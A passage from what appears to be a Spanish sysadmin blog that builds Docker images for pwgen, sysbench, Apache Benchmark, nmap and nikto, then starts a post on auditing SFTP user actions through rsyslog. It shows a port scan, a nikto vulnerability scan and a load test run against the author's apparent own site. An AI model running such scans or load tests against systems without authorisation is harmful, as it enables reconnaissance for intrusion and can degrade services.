&lt;p&gt;Lo podemos construir si no lo tuviéramos, o lo podemos descargar de un registro &lt;strong&gt;docker&lt;/strong&gt;. Ocupa menos de 5 mb, contando el sistema operativo; nada mal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t pwgen pwgen/
...
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
pwgen                                                                                 latest              4b338afada4e        &lt;span class="m"&gt;19&lt;/span&gt; seconds ago      &lt;span class="m"&gt;4&lt;/span&gt;.844 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La ejecución es bastante simple también; basta con ejecutar hasta encontrar una contraseña que nos guste:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm pwgen
Es4toh&lt;span class="o"&gt;(&lt;/span&gt;f
gerard@hermes:~/docker/tools$ docker run --rm pwgen
ieV7yoh&lt;span class="o"&gt;}&lt;/span&gt;
gerard@hermes:~/docker/tools$ docker run --rm pwgen
jei!s7ph
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Analizando el rendimiento de un servidor&lt;/h2&gt;
&lt;p&gt;Existe una aplicación llamada &lt;strong&gt;sysbench&lt;/strong&gt; que hace una batería de pruebas para determinar el rendimiento de los parámetros básicos de una máquina. Como no podemos ir instalando este paquete, y como no tenemos la certeza que el sistema operativo del servidor soporte este binario, lo podemos poner en un contenedor y acompañarlo del sistema operativo que nos apetezca.&lt;/p&gt;
&lt;p&gt;En este caso, el contenedor ejecuta usando los recursos de la máquina &lt;em&gt;host&lt;/em&gt;, y eso es precisamente lo que &lt;strong&gt;sysbench&lt;/strong&gt; mide. Así obtendremos diferentes resultados en cada máquina, a pesar de que la imagen es la misma.&lt;/p&gt;
&lt;p&gt;La mala noticia es que este paquete no está disponible para &lt;strong&gt;Alpine Linux&lt;/strong&gt;, así que usaré otra imagen, por ejemplo, &lt;strong&gt;Debian Jessie&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat sysbench/Dockerfile 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y sysbench &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
COPY bench.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bench.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ cat sysbench/bench.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="c1"&gt;# CPU&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CPU: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;cpu run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;total time:&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{print $3}&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Memory&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Memory: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;memory run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;transferred&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\(&lt;/span&gt; -f2 &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\)&lt;/span&gt; -f1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Disk&lt;/span&gt;
sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio prepare &amp;gt; /dev/null
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Disk: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio --file-test-mode&lt;span class="o"&gt;=&lt;/span&gt;rndrw run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;transferred&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\(&lt;/span&gt; -f2 &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\)&lt;/span&gt; -f1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio cleanup &amp;gt; /dev/null
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: el &lt;em&gt;script bench.sh&lt;/em&gt; tiene permisos de ejecución, por lo que también lo tendrá en la imagen.&lt;/p&gt;
&lt;p&gt;Tras construir o hacer el correspondiente &lt;em&gt;docker pull&lt;/em&gt;, comprobamos que el tamaño es bastante superior, debido al sistema operativo base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t sysbench sysbench/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
sysbench                                                                              latest              ec75e66aae41        &lt;span class="m"&gt;5&lt;/span&gt; seconds ago       &lt;span class="m"&gt;127&lt;/span&gt;.1 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda ejecutar para ver el rendimiento de la máquina testeada, sin dejar basura en la máquina destino.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm sysbench
CPU: &lt;span class="m"&gt;11&lt;/span&gt;.1682s
Memory: &lt;span class="m"&gt;3059&lt;/span&gt;.66 MB/sec
Disk: &lt;span class="m"&gt;12&lt;/span&gt;.088Mb/sec
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de carga web&lt;/h2&gt;
&lt;p&gt;Hay muchas herramientas en este campo, pero a mi me sigue gustando mucho el &lt;em&gt;Apache benchmark&lt;/em&gt;. El binario &lt;strong&gt;ab&lt;/strong&gt; se suele encontrar en el paquete &lt;strong&gt;apache2-utils&lt;/strong&gt; y este está disponible en &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat ab/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache apache2-utils
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/ab&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Conseguimos nuestra imagen por los medios habituales; la imagen no llega a los 10 mb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t ab ab/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
ab                                                                                    latest              51b78f9dfeea        &lt;span class="m"&gt;4&lt;/span&gt; seconds ago       &lt;span class="m"&gt;9&lt;/span&gt;.808 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda testear contra la víctima de nuestra prueba de estrés.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm ab -k -c5 -t5 http://www.linuxsysadmin.tk/
This is ApacheBench, Version &lt;span class="m"&gt;2&lt;/span&gt;.3 &amp;lt;&lt;span class="nv"&gt;$Revision&lt;/span&gt;: &lt;span class="m"&gt;1748469&lt;/span&gt; $&amp;gt;
Copyright &lt;span class="m"&gt;1996&lt;/span&gt; Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;be patient&lt;span class="o"&gt;)&lt;/span&gt;
Completed &lt;span class="m"&gt;5000&lt;/span&gt; requests
Completed &lt;span class="m"&gt;10000&lt;/span&gt; requests
Finished &lt;span class="m"&gt;10152&lt;/span&gt; requests


Server Software:        GitHub.com
Server Hostname:        www.linuxsysadmin.tk
Server Port:            &lt;span class="m"&gt;80&lt;/span&gt;

Document Path:          /
Document Length:        &lt;span class="m"&gt;37545&lt;/span&gt; bytes

Concurrency Level:      &lt;span class="m"&gt;5&lt;/span&gt;
Time taken &lt;span class="k"&gt;for&lt;/span&gt; tests:   &lt;span class="m"&gt;5&lt;/span&gt;.001 seconds
Complete requests:      &lt;span class="m"&gt;10152&lt;/span&gt;
Failed requests:        &lt;span class="m"&gt;0&lt;/span&gt;
Keep-Alive requests:    &lt;span class="m"&gt;10152&lt;/span&gt;
Total transferred:      &lt;span class="m"&gt;387253740&lt;/span&gt; bytes
HTML transferred:       &lt;span class="m"&gt;381176513&lt;/span&gt; bytes
Requests per second:    &lt;span class="m"&gt;2030&lt;/span&gt;.04 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;#/sec] (mean)&lt;/span&gt;
Time per request:       &lt;span class="m"&gt;2&lt;/span&gt;.463 &lt;span class="o"&gt;[&lt;/span&gt;ms&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;mean&lt;span class="o"&gt;)&lt;/span&gt;
Time per request:       &lt;span class="m"&gt;0&lt;/span&gt;.493 &lt;span class="o"&gt;[&lt;/span&gt;ms&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;mean, across all concurrent requests&lt;span class="o"&gt;)&lt;/span&gt;
Transfer rate:          &lt;span class="m"&gt;75622&lt;/span&gt;.04 &lt;span class="o"&gt;[&lt;/span&gt;Kbytes/sec&lt;span class="o"&gt;]&lt;/span&gt; received

Connection Times &lt;span class="o"&gt;(&lt;/span&gt;ms&lt;span class="o"&gt;)&lt;/span&gt;
              min  mean&lt;span class="o"&gt;[&lt;/span&gt;+/-sd&lt;span class="o"&gt;]&lt;/span&gt; median   max
Connect:        &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;.0      &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;1&lt;/span&gt;
Processing:     &lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;3&lt;/span&gt;.9      &lt;span class="m"&gt;2&lt;/span&gt;     &lt;span class="m"&gt;216&lt;/span&gt;
Waiting:        &lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;2&lt;/span&gt;.5      &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;109&lt;/span&gt;
Total:          &lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;3&lt;/span&gt;.9      &lt;span class="m"&gt;2&lt;/span&gt;     &lt;span class="m"&gt;216&lt;/span&gt;

Percentage of the requests served within a certain &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ms&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="m"&gt;50&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;66&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;75&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;80&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;90&lt;/span&gt;%      &lt;span class="m"&gt;3&lt;/span&gt;
  &lt;span class="m"&gt;95&lt;/span&gt;%      &lt;span class="m"&gt;3&lt;/span&gt;
  &lt;span class="m"&gt;98&lt;/span&gt;%      &lt;span class="m"&gt;4&lt;/span&gt;
  &lt;span class="m"&gt;99&lt;/span&gt;%      &lt;span class="m"&gt;4&lt;/span&gt;
 &lt;span class="m"&gt;100&lt;/span&gt;%    &lt;span class="m"&gt;216&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;longest request&lt;span class="o"&gt;)&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de penetración de puertos&lt;/h2&gt;
&lt;p&gt;La herramienta más versátil en este campo es &lt;strong&gt;nmap&lt;/strong&gt;. El uso de este comando no es trivial, y un &lt;em&gt;pentester&lt;/em&gt; experto puede hacer cosas realmente impresionantes. De momento nos basta con que funcione.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat nmap/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nmap
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/nmap&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Usamos el anterior &lt;em&gt;Dockerfile&lt;/em&gt; para crear la imagen (o hacemos el &lt;em&gt;docker pull&lt;/em&gt; correspondiente) y vemos que la imagen se nos va a 18 mb. Nada mal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t nmap nmap/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
nmap                                                                                  latest              d808ce19de05        &lt;span class="m"&gt;4&lt;/span&gt; seconds ago       &lt;span class="m"&gt;17&lt;/span&gt;.58 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría probar que todo funciona, lanzando un contenedor para testear alguna IP o nombre de dominio. En este caso, con escanear los puertos web, ssh, mongodb y mysql, nos vale. El resultado es que solamente los puertos web están abiertos, con un &lt;em&gt;firewall&lt;/em&gt; cortando los demás.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm nmap www.linuxsysadmin.tk -p80,443,22,27017,3306 -Pn

Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.12 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:14 UTC
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;151&lt;/span&gt;.101.0.133&lt;span class="o"&gt;)&lt;/span&gt;
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0011s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Other addresses &lt;span class="k"&gt;for&lt;/span&gt; www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;not scanned&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;151&lt;/span&gt;.101.192.133 &lt;span class="m"&gt;151&lt;/span&gt;.101.128.133 &lt;span class="m"&gt;151&lt;/span&gt;.101.64.133
PORT      STATE    SERVICE
&lt;span class="m"&gt;22&lt;/span&gt;/tcp    filtered ssh
&lt;span class="m"&gt;80&lt;/span&gt;/tcp    open     http
&lt;span class="m"&gt;443&lt;/span&gt;/tcp   open     https
&lt;span class="m"&gt;3306&lt;/span&gt;/tcp  filtered mysql
&lt;span class="m"&gt;27017&lt;/span&gt;/tcp filtered mongod

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;1&lt;/span&gt;.41 seconds
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de seguridad web&lt;/h2&gt;
&lt;p&gt;Una &lt;em&gt;suite&lt;/em&gt; muy interesante para descubrir vulnerabilidades web es &lt;strong&gt;nikto&lt;/strong&gt;. Se trata de un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;perl&lt;/strong&gt; bastante completo, que va a probar las vulnerabilidades conocidas y nos va a dar los códigos en la &lt;a href="https://en.wikipedia.org/wiki/Open_Source_Vulnerability_Database"&gt;Open_Source_Vulnerability_Database&lt;/a&gt;, ahora cerrada.&lt;/p&gt;
&lt;p&gt;Para obtener nuestra imagen, basta con instalar el paquete en una imagen &lt;strong&gt;Alpine Linux&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat nikto/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nikto
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/nikto.pl&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras la construcción vemos que esta imagen es la mas grande de las anteriormente mencionadas, de entre las que hemos basado en &lt;strong&gt;Alpine Linux&lt;/strong&gt;, ocupando mas de 60 mb; pensad en el tamaño de una máquina virtual dedicada: no bajaría de 1 gb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t nikto nikto/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
nikto                                                                                 latest              9167dce64715        &lt;span class="m"&gt;3&lt;/span&gt; seconds ago       &lt;span class="m"&gt;61&lt;/span&gt;.05 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando &lt;strong&gt;nikto&lt;/strong&gt; tiene muchas opciones, que saltan a la vista si usáis el contenedor sin parámetros adicionales. Para verificar su funcionamiento me voy a limitar a escanear un solo &lt;em&gt;host&lt;/em&gt; con la batería de pruebas estándares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm nikto -host www.linuxsysadmin.tk
- ***** SSL support not available &lt;span class="o"&gt;(&lt;/span&gt;see docs &lt;span class="k"&gt;for&lt;/span&gt; SSL install&lt;span class="o"&gt;)&lt;/span&gt; *****
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          &lt;span class="m"&gt;151&lt;/span&gt;.101.192.133
+ Target Hostname:    www.linuxsysadmin.tk
+ Target Port:        &lt;span class="m"&gt;80&lt;/span&gt;
+ Start Time:         &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:19:15 &lt;span class="o"&gt;(&lt;/span&gt;GMT0&lt;span class="o"&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ Server: GitHub.com
+ Retrieved via header: &lt;span class="m"&gt;1&lt;/span&gt;.1 varnish
+ Retrieved x-served-by header: cache-cdg8733-CDG
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-github-request-id&amp;#39;&lt;/span&gt; found, with contents: 689C5D15:51BA:5DE0B1A:585A54BB
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-served-by&amp;#39;&lt;/span&gt; found, with contents: cache-cdg8733-CDG
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-fastly-request-id&amp;#39;&lt;/span&gt; found, with contents: 43f82a2690743c1b1b674d92672b1e277016f83e
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-cache-hits&amp;#39;&lt;/span&gt; found, with contents: &lt;span class="m"&gt;3&lt;/span&gt;
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;access-control-allow-origin&amp;#39;&lt;/span&gt; found, with contents: *
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-timer&amp;#39;&lt;/span&gt; found, with contents: S1482315555.254611,VS0,VE0
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-cache&amp;#39;&lt;/span&gt; found, with contents: HIT
+ Server leaks inodes via ETags, header found with file /JoHeWXqS.AP, fields: 0x585799bc 0x8045 
+ No CGI Directories found &lt;span class="o"&gt;(&lt;/span&gt;use &lt;span class="s1"&gt;&amp;#39;-C all&amp;#39;&lt;/span&gt; to force check all possible &lt;span class="nb"&gt;dirs&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;content-security-policy&amp;#39;&lt;/span&gt; found, with contents: default-src &lt;span class="s1"&gt;&amp;#39;none&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; style-src &lt;span class="s1"&gt;&amp;#39;unsafe-inline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; img-src data:&lt;span class="p"&gt;;&lt;/span&gt; connect-src &lt;span class="s1"&gt;&amp;#39;self&amp;#39;&lt;/span&gt;
+ Server banner has changed from &lt;span class="s1"&gt;&amp;#39;GitHub.com&amp;#39;&lt;/span&gt; to &lt;span class="s1"&gt;&amp;#39;Varnish&amp;#39;&lt;/span&gt; which may suggest a WAF, load balancer or proxy is in place
+ OSVDB-3092: /sitemap.xml: This gives a nice listing of the site content.
+ &lt;span class="m"&gt;6544&lt;/span&gt; items checked: &lt;span class="m"&gt;0&lt;/span&gt; error&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; and &lt;span class="m"&gt;13&lt;/span&gt; item&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; reported on remote host
+ End Time:           &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:31:23 &lt;span class="o"&gt;(&lt;/span&gt;GMT0&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;728&lt;/span&gt; seconds&lt;span class="o"&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ &lt;span class="m"&gt;1&lt;/span&gt; host&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; tested
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="toolbox"></category><category term="docker"></category><category term="pwgen"></category><category term="sysbench"></category><category term="apache benchmark"></category><category term="nmap"></category><category term="nikto"></category></entry><entry><title>Auditando las acciones de los usuarios de nuestro SFTP</title><link href="https://www.linuxsysadmin.ml/2017/04/auditando-las-acciones-de-los-usuarios-de-nuestro-sftp.html" rel="alternate"></link><published>2017-04-03T10:00:00+02:00</published><updated>2017-04-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-03:/2017/04/auditando-las-acciones-de-los-usuarios-de-nuestro-sftp.html</id><summary type="html">&lt;p&gt;Algunas veces me he encontrado con usuarios de alguno de mis servidores SFTP que se quejan porque "les desaparecen archivos". Si estamos seguros que esas desapariciones no tienen nada que ver con nosotros, lo mas probable es que lo hayan hecho los mismos usuarios, sea manualmente o de forma automática …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces me he encontrado con usuarios de alguno de mis servidores SFTP que se quejan porque "les desaparecen archivos". Si estamos seguros que esas desapariciones no tienen nada que ver con nosotros, lo mas probable es que lo hayan hecho los mismos usuarios, sea manualmente o de forma automática.&lt;/p&gt;
&lt;p&gt;En casos así, no podemos hacer nada para demostrar cuando y porqué ha pasado, pero podemos pillar al usuario &lt;em&gt;in fraganti&lt;/em&gt; en casos posteriores. Para eso solo es necesario habilitar un nivel de trazas que nos permita capturar la actividad de un usuario.&lt;/p&gt;
&lt;p&gt;El mismo servidor SFTP nos enviará esta actividad al &lt;em&gt;rsyslog&lt;/em&gt; de forma automática si habilitamos el &lt;em&gt;loglevel&lt;/em&gt; adecuado a nuestro comando SFTP. A partir de aquí se asume que el servicio &lt;em&gt;rsyslog&lt;/em&gt; está instalado en nuestro sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /etc/ssh/ssh_config 
...
ForceCommand internal-sftp -l VERBOSE
...
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta directiva nos va a enviar las trazas al &lt;em&gt;rsyslog&lt;/em&gt; escribiendo los mensajes en &lt;em&gt;/dev/log&lt;/em&gt;, &lt;strong&gt;siempre desde el punto de vista de la sesión activa&lt;/strong&gt;. Eso significa que si hemos enjaulado a nuestros usuarios, la posición del dispositivo no será la de siempre; un usuario enjaulado en &lt;em&gt;/srv/jails/guest/&lt;/em&gt; debería tener el dispositivo en &lt;em&gt;/srv/jails/guest/dev/log&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La parte buena es que el mismo &lt;em&gt;rsyslog&lt;/em&gt; se encarga de crear ese dispositivo para nosotros, con la configuración adecuada. Solo necesitamos crear la carpeta &lt;em&gt;dev/&lt;/em&gt; en la jaula de nuestro usuario y añadir la directiva correcta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ mkdir /srv/jails/guest/dev
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El otro punto espinoso es que la configuración del &lt;em&gt;rsyslog&lt;/em&gt; no lleva ninguna regla por defecto para guardar esos &lt;em&gt;logs&lt;/em&gt; en ningún fichero. Con añadir una nueva línea a la configuración de nuestro &lt;em&gt;rsyslog&lt;/em&gt; será suficiente.&lt;/p&gt;
&lt;p&gt;Podemos añadir ambas directivas mediante un fichero de configuración nuevo, utilizando la carpeta &lt;em&gt;/etc/rsyslog.d/&lt;/em&gt;, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /etc/rsyslog.d/jails.conf 
&lt;span class="nv"&gt;$AddUnixListenSocket&lt;/span&gt; /srv/jails/guest/dev/log

:programname, isequal, &lt;span class="s2"&gt;&amp;quot;internal-sftp&amp;quot;&lt;/span&gt; -/var/log/sftp.log
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y tras recargar la configuración de los servicios SFTP y &lt;em&gt;rsyslog&lt;/em&gt;, habremos acabado y podremos ver el resultado funcionando, asumiendo que haya entrado alguna sesión desde la recarga de los servicios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /var/log/sftp.log
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: session opened &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;local&lt;/span&gt; user guest from &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1&lt;span class="o"&gt;]&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: received client version &lt;span class="m"&gt;3&lt;/span&gt;
